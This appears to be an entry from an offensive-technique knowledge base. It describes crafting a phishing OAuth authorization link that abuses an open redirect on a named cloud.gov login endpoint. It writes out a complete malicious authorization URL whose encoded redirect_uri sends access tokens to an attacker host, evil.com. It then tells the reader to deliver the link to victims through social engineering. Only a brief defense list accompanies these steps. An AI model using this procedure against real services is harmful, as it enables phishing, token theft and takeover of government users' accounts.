---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - oauth
  - phishing
  - open-redirect
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1566.002]]'
updated_at: '2025-12-14T17:24:38.861Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.002]]'
---
# Craft-Malicious-OAuth-Authorization-Link

## Summary

This procedure involves constructing a malicious OAuth authorization URL that exploits an open redirect vulnerability in the redirect_uri parameter, setting the stage for token leakage by directing authenticated users to an attacker-controlled domain.

## Description

In OAuth 2.0 flows, the authorization endpoint (e.g., https://login.fr.cloud.gov/oauth/authorize) accepts a redirect_uri parameter to send the user back after authentication. Without validation, an attacker can set this to an arbitrary external URL, such as https://evil.com/auth/callback. When a victim authenticates, the access token is appended to this URL, leaking it to the attacker. This procedure focuses on crafting the initial malicious link, typically distributed via phishing to initiate the attack on .gov accounts using the identity provider at https://idp.fr.cloud.gov.

## Requirements

1. Knowledge of the target OAuth endpoint and valid client_id (can be tested or obtained from public sources)
2. Control over an external domain (e.g., evil.com) to host the callback endpoint for capturing leaks
3. Basic URL encoding skills to properly format the redirect_uri

## Defense

Defensive measures and detection strategies:

- Implement strict allowlisting for redirect_uri domains in the OAuth server configuration
- Monitor authorization logs for unusual redirect_uri values pointing to external domains
- Educate users on phishing risks and verify OAuth links before clicking

## Objectives

1. Create a functional phishing link that loads the OAuth authorization page
2. Ensure the redirect_uri points to attacker-controlled infrastructure
3. Prepare for token capture in subsequent authentication step

## Instructions

### Step 1: Identify OAuth Parameters

**Context**: Gather necessary parameters for the authorization request, including a valid client_id and response_type for implicit flow (token).

No command required; manually note: client_id=███, response_type=token, state=███ (optional).

> Use a known or tested client_id from the target service. The state parameter adds CSRF protection but does not prevent the redirect exploit.

### Step 2: Construct and Encode the Malicious URL

**Context**: Build the full authorization URL with the malicious redirect_uri, ensuring proper URL encoding to avoid parsing errors.

Manually construct:

Base: https://login.fr.cloud.gov/oauth/authorize

Full URL: https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

> The redirect_uri is encoded as https%3A%2F%2Fevil.com%2Fauth%2Fcallback. Test the link in a browser to confirm it loads the login page without immediate errors.

### Step 3: Distribute the Link

**Context**: Deliver the crafted link to the target victim via email, messaging, or other channels to prompt authentication.

No command; use social engineering tactics to encourage clicking and login.

> Success is indicated if the victim accesses the link and proceeds to authentication.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[T1566.002]] Spearphishing Link

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[oauth]]
- [[Phishing]]
- [[open-redirect]]
